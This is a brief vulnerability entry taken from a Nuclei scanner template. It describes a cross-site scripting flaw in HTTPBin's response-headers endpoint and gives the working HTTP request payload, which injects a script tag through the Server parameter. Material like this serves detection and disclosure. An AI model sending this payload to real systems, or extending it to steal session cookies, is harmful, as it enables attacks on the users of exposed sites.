# Vulnerability: HTTPBin - Cross-Site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`httpbin-contenttype-xss.yaml`)

## Description
HTTPBin contains a cross-site scripting vulnerability which can allow an attacker to execute arbitrary script. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/response-headers?Content-Type=text/html&Server=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
```

